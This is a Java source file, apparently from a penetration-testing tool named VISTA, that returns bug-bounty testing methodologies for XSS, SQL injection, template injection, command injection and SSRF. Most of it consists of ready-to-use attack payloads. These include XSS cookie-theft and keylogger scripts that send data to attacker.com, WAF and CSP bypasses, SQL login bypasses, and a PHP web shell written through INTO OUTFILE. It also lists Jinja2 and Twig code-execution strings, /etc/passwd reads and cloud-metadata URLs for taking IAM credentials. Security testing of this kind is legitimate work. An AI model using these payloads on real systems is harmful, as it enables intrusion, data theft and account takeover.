package com.vista.security.core;

import java.util.*;

/**
 * Systematic Testing Methodology Engine
 * 
 * Provides step-by-step exploitation methodologies for common vulnerabilities.
 * Based on real-world bug bounty hunting practices and PayloadsAllTheThings.
 */
public class SystematicTestingEngine {

    /**
     * Get systematic testing methodology for a vulnerability type.
     * Uses contains()-based matching so user queries like "How to test for XSS?" correctly match.
     */
    public static TestingMethodology getMethodology(String vulnerabilityType, 
                                                     String requestContext, 
                                                     String responseContext) {
        if (vulnerabilityType == null || vulnerabilityType.isBlank()) return getGenericMethodology("General");
        String upper = vulnerabilityType.toUpperCase();
        if (upper.contains("XSS") || upper.contains("CROSS-SITE SCRIPTING") || upper.contains("CROSS SITE SCRIPTING")) return getXSSMethodology(requestContext, responseContext);
        if (upper.contains("SQLI") || upper.contains("SQL INJECTION") || upper.contains("SQL")) return getSQLiMethodology(requestContext, responseContext);
        if (upper.contains("SSTI") || upper.contains("TEMPLATE INJECTION")) return getSSTIMethodology(requestContext, responseContext);
        if (upper.contains("COMMAND INJECTION") || upper.contains("CMDI") || upper.contains("RCE") || upper.contains("COMMAND")) return getCommandInjectionMethodology(requestContext, responseContext);
        if (upper.contains("SSRF") || upper.contains("SERVER-SIDE REQUEST")) return getSSRFMethodology(requestContext, responseContext);
        return getGenericMethodology(vulnerabilityType);
    }

    /**
     * XSS Systematic Testing Methodology
     */
    private static TestingMethodology getXSSMethodology(String request, String response) {
        TestingMethodology methodology = new TestingMethodology("XSS (Cross-Site Scripting)");
        
        // Phase 1: Reconnaissance
        TestingPhase recon = new TestingPhase("Phase 1: Reconnaissance", 
            "Understand the application behavior and identify injection points");
        
        recon.addStep(new TestingStep(
            "1.1 Identify Reflection Points",
            "Test if input is reflected in the response",
            Arrays.asList(
                "Send unique marker: test123xyz",
                "Search for marker in response",
                "Note the exact location (HTML body, attribute, JavaScript, etc.)"
            ),
            "If marker appears in response → Reflection confirmed ✓"
        ));
        
        recon.addStep(new TestingStep(
            "1.2 Analyze Reflection Context",
            "Determine WHERE your input is reflected",
            Arrays.asList(
                "HTML Body: <div>YOUR_INPUT</div>",
                "HTML Attribute: <input value='YOUR_INPUT'>",
                "JavaScript: var x = 'YOUR_INPUT';",
                "JavaScript Template: `${YOUR_INPUT}`",
                "Event Handler: onclick='YOUR_INPUT'",
                "Inside <script> tag"
            ),
            "Context determines which payloads will work"
        ));
        
        recon.addStep(new TestingStep(
            "1.3 Check for Output Encoding",
            "Test if dangerous characters are encoded",
            Arrays.asList(
                "Send: <script>alert(1)</script>",
                "Check response for:",
                "  - Encoded: &lt;script&gt; (SAFE - encoding present)",
                "  - Unencoded: <script> (VULNERABLE - no encoding)",
                "Send: '\"><svg/onload=alert(1)>",
                "Check if quotes and brackets are encoded"
            ),
            "If encoded → Need encoding bypass. If unencoded → Direct exploitation possible"
        ));
        
        methodology.addPhase(recon);
        
        // Phase 2: WAF Detection
        TestingPhase wafDetection = new TestingPhase("Phase 2: WAF Detection",
            "Identify if a Web Application Firewall is blocking payloads");
        
        wafDetection.addStep(new TestingStep(
            "2.1 Test for WAF",
            "Send common XSS payloads and observe responses",
            Arrays.asList(
                "Send: <script>alert(1)</script>",
                "Send: <img src=x onerror=alert(1)>",
                "Observe response:",
                "  - 403 Forbidden → WAF likely present",
                "  - 406 Not Acceptable → WAF blocking",
                "  - Custom error page → WAF detected",
                "Check headers for: cf-ray, x-sucuri-id, x-amzn-requestid"
            ),
            "If WAF detected → Use WAF-specific bypasses from Phase 3"
        ));
        
        methodology.addPhase(wafDetection);
        
        // Phase 3: Exploitation
        TestingPhase exploitation = new TestingPhase("Phase 3: Exploitation",
            "Craft and test payloads based on context and protections");
        
        exploitation.addStep(new TestingStep(
            "3.1 Basic Payloads (No WAF)",
            "Start with simple payloads if no WAF detected",
            Arrays.asList(
                "HTML Context: <script>alert(document.domain)</script>",
                "Attribute Context: \" onload=\"alert(1)",
                "JavaScript Context: '-alert(1)-'",
                "Event Handler: <img src=x onerror=alert(1)>",
                "SVG: <svg/onload=alert(1)>"
            ),
            "Test each payload and verify execution in browser"
        ));
        
        exploitation.addStep(new TestingStep(
            "3.2 Encoding Bypass",
            "If output encoding detected, try bypass techniques",
            Arrays.asList(
                "URL Encoding: %3Cscript%3Ealert(1)%3C/script%3E",
                "Double Encoding: %253Cscript%253E",
                "HTML Entities: &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
                "Unicode: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                "Mixed Encoding: %3Cscript%3Ealert&#40;1&#41;%3C/script%3E"
            ),
            "Reference: PayloadsAllTheThings/XSS Injection/README.md#encoding-bypass"
        ));
        
        exploitation.addStep(new TestingStep(
            "3.3 WAF Bypass Techniques",
            "If WAF detected, use WAF-specific bypasses",
            Arrays.asList(
                "Cloudflare:",
                "  - <svg/onload=alert(1)//>",
                "  - <script>alert(String.fromCharCode(88,83,83))</script>",
                "ModSecurity:",
                "  - <ScRiPt>alert(1)</sCrIpT> (case variation)",
                "  - <script>alert(1)%00</script> (null byte)",
                "Akamai:",
                "  - <svg><animate onbegin=alert(1)>",
                "AWS WAF:",
                "  - <details open ontoggle=alert(1)>",
                "Generic:",
                "  - <marquee onstart=alert(1)>",
                "  - <body onload=alert(1)>"
            ),
            "Reference: PayloadsAllTheThings/XSS Injection/README.md#waf-bypass"
        ));
        
        exploitation.addStep(new TestingStep(
            "3.4 Context-Specific Payloads",
            "Use payloads specific to reflection context",
            Arrays.asList(
                "Inside HTML Attribute:",
                "  - \" onload=\"alert(1)",
                "  - ' onload='alert(1)",
                "Inside JavaScript String:",
                "  - ';alert(1);//",
                "  - '-alert(1)-'",
                "Inside JavaScript Template Literal:",
                "  - ${alert(1)}",
                "Inside Event Handler:",
                "  - alert(1)//",
                "  - alert(1)}//",
                "Inside <script> tag:",
                "  - </script><script>alert(1)</script>"
            ),
            "Match payload to exact reflection context"
        ));
        
        exploitation.addStep(new TestingStep(
            "3.5 CSP Bypass (if CSP present)",
            "If Content-Security-Policy header detected",
            Arrays.asList(
                "Check CSP policy in response headers",
                "JSONP Abuse:",
                "  - <script src=\"https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1\"></script>",
                "Use Allowed Domains:",
                "  - Find allowed CDN in CSP",
                "  - <script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.js\"></script>",
                "  - <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
                "Base Tag Injection:",
                "  - <base href=\"https://attacker.com/\">",
                "Dangling Markup:",
                "  - <img src='https://attacker.com?"
            ),
            "Reference: PayloadsAllTheThings/XSS Injection/README.md#csp-bypass"
        ));
        
        methodology.addPhase(exploitation);
        
        // Phase 4: Verification
        TestingPhase verification = new TestingPhase("Phase 4: Verification",
            "Confirm the vulnerability is real and exploitable");
        
        verification.addStep(new TestingStep(
            "4.1 Browser Verification",
            "Test payload in actual browser to confirm execution",
            Arrays.asList(
                "Use VISTA's headless browser verification",
                "Or manually test in browser:",
                "  1. Copy the full URL with payload",
                "  2. Open in browser",
                "  3. Check if alert() executes",
                "  4. Check browser console for errors"
            ),
            "Only report if payload ACTUALLY executes in browser"
        ));
        
        verification.addStep(new TestingStep(
            "4.2 Impact Demonstration",
            "Create proof-of-concept for bug bounty report",
            Arrays.asList(
                "Cookie Theft:",
                "  - <script>fetch('https://attacker.com?c='+document.cookie)</script>",
                "Keylogging:",
                "  - <script>document.onkeypress=function(e){fetch('https://attacker.com?k='+e.key)}</script>",
                "Defacement:",
                "  - <script>document.body.innerHTML='<h1>Hacked</h1>'</script>",
                "Account Takeover:",
                "  - Steal session token and demonstrate account access"
            ),
            "Higher impact = Higher bounty"
        ));
        
        methodology.addPhase(verification);
        
        return methodology;
    }

    /**
     * SQL Injection Systematic Testing Methodology
     */
    private static TestingMethodology getSQLiMethodology(String request, String response) {
        TestingMethodology methodology = new TestingMethodology("SQL Injection");
        
        // Phase 1: Detection
        TestingPhase detection = new TestingPhase("Phase 1: Detection",
            "Identify if SQL injection is possible");
        
        detection.addStep(new TestingStep(
            "1.1 Error-Based Detection",
            "Trigger SQL errors to confirm injection",
            Arrays.asList(
                "Send single quote: '",
                "Send double quote: \"",
                "Send: ' OR '1'='1",
                "Look for SQL errors in response:",
                "  - MySQL: 'You have an error in your SQL syntax'",
                "  - PostgreSQL: 'unterminated quoted string'",
                "  - MSSQL: 'Unclosed quotation mark'",
                "  - Oracle: 'ORA-00933'"
            ),
            "If SQL error appears → SQLi confirmed ✓"
        ));
        
        detection.addStep(new TestingStep(
            "1.2 Boolean-Based Detection",
            "Test if application behavior changes with true/false conditions",
            Arrays.asList(
                "Send: ' AND '1'='1 (TRUE condition)",
                "Send: ' AND '1'='2 (FALSE condition)",
                "Compare responses:",
                "  - Different content/length → Boolean-based SQLi",
                "  - Same response → Try other techniques"
            ),
            "Different responses indicate boolean-based blind SQLi"
        ));
        
        detection.addStep(new TestingStep(
            "1.3 Time-Based Detection",
            "Test if you can cause time delays",
            Arrays.asList(
                "MySQL: ' AND SLEEP(5)--",
                "PostgreSQL: '; SELECT pg_sleep(5)--",
                "MSSQL: '; WAITFOR DELAY '00:00:05'--",
                "Oracle: ' AND DBMS_LOCK.SLEEP(5)--",
                "Measure response time:",
                "  - 5+ seconds delay → Time-based SQLi confirmed"
            ),
            "Time delay confirms blind SQL injection"
        ));
        
        methodology.addPhase(detection);
        
        // Phase 2: Fingerprinting
        TestingPhase fingerprinting = new TestingPhase("Phase 2: Database Fingerprinting",
            "Identify the database type and version");
        
        fingerprinting.addStep(new TestingStep(
            "2.1 Identify Database Type",
            "Different databases have different syntax",
            Arrays.asList(
                "MySQL: ' AND @@version--",
                "PostgreSQL: ' AND version()--",
                "MSSQL: ' AND @@version--",
                "Oracle: ' AND banner FROM v$version--",
                "SQLite: ' AND sqlite_version()--",
                "Look for version strings in response or errors"
            ),
            "Knowing database type determines which payloads to use"
        ));
        
        methodology.addPhase(fingerprinting);
        
        // Phase 3: Exploitation
        TestingPhase exploitation = new TestingPhase("Phase 3: Exploitation",
            "Extract data or bypass authentication");
        
        exploitation.addStep(new TestingStep(
            "3.1 Authentication Bypass",
            "Bypass login forms",
            Arrays.asList(
                "Username: admin' OR '1'='1",
                "Password: anything",
                "Or: admin'--",
                "Or: admin' OR 1=1--",
                "Or: admin' OR 1=1#",
                "Or: admin'/**/OR/**/1=1--"
            ),
            "Reference: PayloadsAllTheThings/SQL Injection/README.md#authentication-bypass"
        ));
        
        exploitation.addStep(new TestingStep(
            "3.2 UNION-Based Extraction",
            "Extract data using UNION SELECT",
            Arrays.asList(
                "Find number of columns:",
                "  - ' ORDER BY 1--",
                "  - ' ORDER BY 2--",
                "  - Continue until error (n-1 = column count)",
                "Or: ' UNION SELECT NULL,NULL,NULL--",
                "Extract data:",
                "  - ' UNION SELECT username,password,3 FROM users--",
                "  - ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
            ),
            "Reference: PayloadsAllTheThings/SQL Injection/README.md#union-based"
        ));
        
        exploitation.addStep(new TestingStep(
            "3.3 WAF Bypass for SQLi",
            "If WAF is blocking SQL keywords",
            Arrays.asList(
                "Case Variation: SeLeCt, UnIoN",
                "Comment Injection: SEL/**/ECT, /*!50000SELECT*/",
                "Whitespace: SELECT%09FROM, SELECT%0AFROM",
                "Encoding: %53%45%4C%45%43%54 (SELECT)",
                "Alternative Operators:",
                "  - OR → ||",
                "  - AND → &&",
                "  - = → LIKE, REGEXP"
            ),
            "Reference: PayloadsAllTheThings/SQL Injection/README.md#waf-bypass"
        ));
        
        exploitation.addStep(new TestingStep(
            "3.4 Time-Based Extraction",
            "Extract data character by character using time delays",
            Arrays.asList(
                "MySQL:",
                "  - ' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--",
                "PostgreSQL:",
                "  - '; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--",
                "Use binary search for faster extraction",
                "Automate with script for full data extraction"
            ),
            "Slower but works when no visible output"
        ));
        
        methodology.addPhase(exploitation);
        
        // Phase 4: Advanced Exploitation
        TestingPhase advanced = new TestingPhase("Phase 4: Advanced Exploitation",
            "File read, RCE, and other advanced techniques");
        
        advanced.addStep(new TestingStep(
            "4.1 File Read",
            "Read files from the server",
            Arrays.asList(
                "MySQL: ' UNION SELECT LOAD_FILE('/etc/passwd')--",
                "PostgreSQL: '; COPY (SELECT '') TO '/tmp/test'--",
                "MSSQL: '; EXEC xp_cmdshell 'type C:\\\\boot.ini'--"
            ),
            "Requires FILE privilege"
        ));
        
        advanced.addStep(new TestingStep(
            "4.2 Remote Code Execution",
            "Execute system commands (high impact!)",
            Arrays.asList(
                "MySQL: '; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
                "MSSQL: '; EXEC xp_cmdshell 'whoami'--",
                "PostgreSQL: '; COPY (SELECT '') TO PROGRAM 'id'--"
            ),
            "Requires elevated privileges - rare but high impact"
        ));
        
        methodology.addPhase(advanced);
        
        return methodology;
    }

    /**
     * SSTI Systematic Testing Methodology
     */
    private static TestingMethodology getSSTIMethodology(String request, String response) {
        TestingMethodology methodology = new TestingMethodology("Server-Side Template Injection (SSTI)");
        
        TestingPhase detection = new TestingPhase("Phase 1: Detection",
            "Identify if template injection is possible");
        
        detection.addStep(new TestingStep(
            "1.1 Basic Detection",
            "Test if template expressions are evaluated",
            Arrays.asList(
                "Send: {{7*7}}",
                "Send: ${7*7}",
                "Send: <%= 7*7 %>",
                "Send: ${{7*7}}",
                "Send: #{7*7}",
                "Check if response contains '49'",
                "If yes → SSTI confirmed ✓"
            ),
            "Different syntax indicates different template engines"
        ));
        
        methodology.addPhase(detection);
        
        TestingPhase identification = new TestingPhase("Phase 2: Template Engine Identification",
            "Identify which template engine is in use");
        
        identification.addStep(new TestingStep(
            "2.1 Identify Engine",
            "Different engines use different syntax",
            Arrays.asList(
                "{{7*7}} = 49 → Jinja2, Twig, or similar",
                "${7*7} = 49 → Freemarker, Velocity, or similar",
                "<%= 7*7 %> = 49 → ERB (Ruby)",
                "Test engine-specific syntax:",
                "  - {{config}} → Jinja2 (Python/Flask)",
                "  - ${7*'7'} = 7777777 → Jinja2",
                "  - {{_self}} → Twig (PHP)"
            ),
            "Knowing the engine determines RCE payloads"
        ));
        
        methodology.addPhase(identification);
        
        TestingPhase exploitation = new TestingPhase("Phase 3: Exploitation",
            "Achieve Remote Code Execution");
        
        exploitation.addStep(new TestingStep(
            "3.1 Jinja2 RCE (Python/Flask)",
            "Execute system commands",
            Arrays.asList(
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "Full RCE:",
                "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
            ),
            "Reference: PayloadsAllTheThings/Server Side Template Injection/README.md#jinja2"
        ));
        
        exploitation.addStep(new TestingStep(
            "3.2 Twig RCE (PHP)",
            "Execute PHP code",
            Arrays.asList(
                "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
                "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"cat /etc/passwd\")}}"
            ),
            "Reference: PayloadsAllTheThings/Server Side Template Injection/README.md#twig"
        ));
        
        methodology.addPhase(exploitation);
        
        return methodology;
    }

    /**
     * Command Injection Systematic Testing Methodology
     */
    private static TestingMethodology getCommandInjectionMethodology(String request, String response) {
        TestingMethodology methodology = new TestingMethodology("Command Injection");
        
        TestingPhase detection = new TestingPhase("Phase 1: Detection",
            "Identify if command injection is possible");
        
        detection.addStep(new TestingStep(
            "1.1 Basic Detection",
            "Test command separators",
            Arrays.asList(
                "Send: ; whoami",
                "Send: | whoami",
                "Send: || whoami",
                "Send: & whoami",
                "Send: && whoami",
                "Send: `whoami`",
                "Send: $(whoami)",
                "Look for command output in response"
            ),
            "If command output appears → Command Injection confirmed ✓"
        ));
        
        detection.addStep(new TestingStep(
            "1.2 Time-Based Detection",
            "Use sleep/ping for blind detection",
            Arrays.asList(
                "Linux: ; sleep 5",
                "Linux: | sleep 5",
                "Windows: & ping -n 5 127.0.0.1",
                "Measure response time",
                "5+ second delay → Blind command injection"
            ),
            "Works even when no output is visible"
        ));
        
        methodology.addPhase(detection);
        
        TestingPhase exploitation = new TestingPhase("Phase 2: Exploitation",
            "Execute commands and extract data");
        
        exploitation.addStep(new TestingStep(
            "2.1 Basic Commands",
            "Execute system commands",
            Arrays.asList(
                "Linux:",
                "  - ; whoami",
                "  - ; id",
                "  - ; cat /etc/passwd",
                "  - ; ls -la",
                "Windows:",
                "  - & whoami",
                "  - & dir",
                "  - & type C:\\\\boot.ini"
            ),
            "Start with simple commands to confirm execution"
        ));
        
        exploitation.addStep(new TestingStep(
            "2.2 Space Bypass",
            "If spaces are filtered",
            Arrays.asList(
                "{cat,/etc/passwd}",
                "$IFS",
                "${IFS}",
                "$IFS$9",
                "<cat<</etc/passwd",
                "{cat,/etc/passwd}"
            ),
            "Reference: PayloadsAllTheThings/Command Injection/README.md#bypass-without-space"
        ));
        
        exploitation.addStep(new TestingStep(
            "2.3 Keyword Bypass",
            "If commands are blacklisted",
            Arrays.asList(
                "Case variation: Cat, CAT",
                "Wildcards: /???/??t /???/p??s??",
                "Variable expansion: $PATH",
                "Encoding: $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"
            ),
            "Reference: PayloadsAllTheThings/Command Injection/README.md#bypass-with-backslash-newline"
        ));
        
        methodology.addPhase(exploitation);
        
        return methodology;
    }

    /**
     * SSRF Systematic Testing Methodology
     */
    private static TestingMethodology getSSRFMethodology(String request, String response) {
        TestingMethodology methodology = new TestingMethodology("Server-Side Request Forgery (SSRF)");
        
        TestingPhase detection = new TestingPhase("Phase 1: Detection",
            "Identify if SSRF is possible");
        
        detection.addStep(new TestingStep(
            "1.1 Basic Detection",
            "Test if server makes requests to your input",
            Arrays.asList(
                "Send: http://burpcollaborator.net",
                "Or use: https://webhook.site",
                "Check if you receive a request",
                "If yes → SSRF confirmed ✓"
            ),
            "Use Burp Collaborator or webhook.site to detect"
        ));
        
        methodology.addPhase(detection);
        
        TestingPhase exploitation = new TestingPhase("Phase 2: Exploitation",
            "Access internal services and cloud metadata");
        
        exploitation.addStep(new TestingStep(
            "2.1 Localhost Bypass",
            "Access internal services",
            Arrays.asList(
                "http://127.0.0.1",
                "http://localhost",
                "http://0.0.0.0",
                "http://[::1]",
                "http://127.1",
                "http://2130706433 (decimal IP)",
                "http://0x7f000001 (hex IP)"
            ),
            "Reference: PayloadsAllTheThings/Server Side Request Forgery/README.md#bypassing-filters"
        ));
        
        exploitation.addStep(new TestingStep(
            "2.2 Cloud Metadata",
            "Access cloud provider metadata (AWS, Azure, GCP)",
            Arrays.asList(
                "AWS: http://169.254.169.254/latest/meta-data/",
                "Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "GCP: http://metadata.google.internal/computeMetadata/v1/",
                "Extract:",
                "  - IAM credentials",
                "  - API keys",
                "  - Instance information"
            ),
            "High impact - can lead to full cloud account compromise"
        ));
        
        methodology.addPhase(exploitation);
        
        return methodology;
    }

    /**
     * Generic methodology for other vulnerability types
     */
    private static TestingMethodology getGenericMethodology(String vulnType) {
        TestingMethodology methodology = new TestingMethodology(vulnType);
        
        TestingPhase generic = new TestingPhase("Testing Approach",
            "General methodology for " + vulnType);
        
        generic.addStep(new TestingStep(
            "1. Research",
            "Understand the vulnerability",
            Arrays.asList(
                "Search: PayloadsAllTheThings/" + vulnType,
                "Read OWASP documentation",
                "Check recent bug bounty reports"
            ),
            "Knowledge is key to successful exploitation"
        ));
        
        generic.addStep(new TestingStep(
            "2. Detection",
            "Identify if vulnerability exists",
            Arrays.asList(
                "Send test payloads",
                "Observe application behavior",
                "Look for error messages"
            ),
            "Confirm vulnerability before exploitation"
        ));
        
        generic.addStep(new TestingStep(
            "3. Exploitation",
            "Craft working exploit",
            Arrays.asList(
                "Use context-specific payloads",
                "Try bypass techniques if blocked",
                "Verify exploitation success"
            ),
            "Document steps for bug bounty report"
        ));
        
        methodology.addPhase(generic);
        return methodology;
    }

    // Data classes
    public static class TestingMethodology {
        public final String vulnerabilityType;
        public final List<TestingPhase> phases = new ArrayList<>();

        public TestingMethodology(String vulnerabilityType) {
            this.vulnerabilityType = vulnerabilityType;
        }

        public void addPhase(TestingPhase phase) {
            phases.add(phase);
        }

        public String toFormattedString() {
            StringBuilder sb = new StringBuilder();
            sb.append("═══════════════════════════════════════════════════════════════\n");
            sb.append("  SYSTEMATIC TESTING METHODOLOGY: ").append(vulnerabilityType).append("\n");
            sb.append("═══════════════════════════════════════════════════════════════\n\n");

            for (int i = 0; i < phases.size(); i++) {
                TestingPhase phase = phases.get(i);
                sb.append("━━━ ").append(phase.name).append(" ━━━\n");
                sb.append(phase.description).append("\n\n");

                for (TestingStep step : phase.steps) {
                    sb.append("▸ ").append(step.title).append("\n");
                    sb.append("  Purpose: ").append(step.purpose).append("\n\n");
                    
                    for (String action : step.actions) {
                        sb.append("  ").append(action).append("\n");
                    }
                    
                    sb.append("\n  ✓ Expected Result: ").append(step.expectedResult).append("\n\n");
                }
            }

            sb.append("═══════════════════════════════════════════════════════════════\n");
            return sb.toString();
        }
    }

    public static class TestingPhase {
        public final String name;
        public final String description;
        public final List<TestingStep> steps = new ArrayList<>();

        public TestingPhase(String name, String description) {
            this.name = name;
            this.description = description;
        }

        public void addStep(TestingStep step) {
            steps.add(step);
        }
    }

    public static class TestingStep {
        public final String title;
        public final String purpose;
        public final List<String> actions;
        public final String expectedResult;

        public TestingStep(String title, String purpose, List<String> actions, String expectedResult) {
            this.title = title;
            this.purpose = purpose;
            this.actions = actions;
            this.expectedResult = expectedResult;
        }
    }
}
